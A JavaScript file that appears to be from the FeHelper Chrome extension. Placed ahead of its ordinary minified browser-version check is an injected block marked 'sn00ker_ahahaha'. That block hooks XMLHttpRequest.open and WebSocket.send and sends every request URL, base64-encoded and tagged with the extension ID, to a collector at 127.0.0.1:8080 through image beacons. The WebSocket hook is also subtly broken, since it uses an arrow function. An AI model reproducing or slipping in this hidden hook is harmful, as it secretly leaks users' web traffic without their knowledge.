function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var _browserSupport=function(){var e=!0;try{new Function("let a = () => {}")}catch(r){e=!1}return e};_browserSupport()||(chrome.browserAction.onClicked.addListener(function(){alert("检测到当前浏览器版本较低，FeHelper可能无法正常运行，建议升级到最新版浏览器以正常使用，谢谢！")}),chrome.browserAction.setBadgeText({text:"异常"}),chrome.browserAction.setPopup({popup:""}));